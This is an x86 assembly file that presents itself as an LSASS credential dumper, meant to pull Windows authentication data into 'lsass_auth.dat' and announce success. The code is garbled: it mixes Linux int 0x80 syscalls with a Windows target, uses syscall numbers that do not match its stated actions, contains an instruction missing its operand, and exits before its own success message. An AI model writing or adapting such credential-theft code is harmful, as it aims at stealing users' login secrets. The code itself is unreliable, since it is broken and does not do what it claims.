section .data
    lsass_pid dd 0
    authfile db 'lsass_auth.dat', 0
    exploit_success db '[+] GRANTED! data extracted to: lsass_auth.dat', 0xA
    exploit_success_len equ $ - exploit_success

section .bss
    hFile resd 1
    hProcess resd 1
    buffer resb 1024
    bytesRead resd 1

section .text
    global _start

_start:
    call findLsass ; achando a local security authority subsystem service
    mov eax, 0x3E
    mov ebx, 0x001F0FFF
    mov ecx, 0
    mov edx, [lsass_pid]
    int 0x80
    mov [hProcess], eax

    mov eax, 0x05
    mov ebx, authfile
    mov ecx, 0x01
    mov edx, 0x02
    int 0x80
    mov [hFile], eax

    mov eax, 0x03
    mov ebx, [hFile]
    mov ecx, buffer
    mov edx, 1024
    int 0x80
    mov [bytesRead], eax

    mov eax, 0x03
    mov ebx, [hFile]
    mov ecx, buffer
    mov edx, [bytesRead]
    int 0x80

    mov eax, 0x06
    mov ebx, [hFile]
    int 0x80

    mov eax, 0x01
    xor ebx, ebx
    int 0x80

    mov eax, 0x04
    mov ebx, 1
    mov ecx, exploit_success
    mov edx, exploit_success_len
    int 0x80

    mov eax, 0x01
    xor ebx, ebx
    int 0x80

findLsass:
    mov eax, 0x02
    int 0x80
    mov ebx, eax
    mov eax, 0x00
    mov ecx, 0x10
    mov edx, 0x1000
    lea esi, [ebp - 0x100]
    int 0x80
    mov esi, [esi + 0x08]
    cmp dword [esi + 0x1C]
    jne findLsass
    mov edi, [esi + 0x20]
    mov edi, [edi + 0x0C]
    mov edi, [edi + 0x14]
    mov edi, [edi]
    mov edi, [edi]
    mov edi, [edi + 0x10]
    mov edi, [edi + 0x3C]
    add edi, 0x78
    mov edi, [edi + 0x10]
    add edi, eax
    mov edi, [edi]
    mov ebp, [edi - 0x04]
    mov ebp, [ebp + 0x0C]
    add ebp, ebx
    ret

dumpfiles:
    mov eax, 0x05
    mov ebx, authfile
    mov ecx, 0x01
    mov edx, 0x02
    int 0x80
    mov [hFile], eax
    mov eax, 0x03
    mov ebx, [hFile]
    mov ecx, buffer
    mov edx, 1024
    int 0x80
    mov [bytesRead], eax

    mov eax, 0x03
    mov ebx, [hFile]
    mov ecx, buffer
    mov edx, [bytesRead]
    int 0x80

    mov eax, 0x06
    mov ebx, [hFile]
    int 0x80

    ret
